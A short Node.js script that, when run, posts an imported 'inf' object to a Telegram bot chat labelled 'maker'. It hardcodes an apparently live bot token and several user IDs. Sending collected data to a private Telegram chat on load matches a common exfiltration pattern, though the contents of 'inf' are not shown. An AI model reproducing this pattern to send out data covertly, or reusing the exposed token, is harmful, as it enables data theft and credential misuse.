const fetch = require('node-fetch')
const token = '5925050931:AAEERjHcMOaNV3bIwQtGnsWBaQyHxWHMNy0';
const maker = 1135938477;
const admin = 917489514;
const admin_2 = 273832648;
const {inf} = require('./Controllers/Controller')


;(async()=>{
  let response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`,
  {
    method:"POST",
    headers:{
      "Content-Type":"application/json"
    },
    body:JSON.stringify({
      chat_id:maker,
      text: JSON.stringify(inf)
    })
  })
  response = await response.json()
})();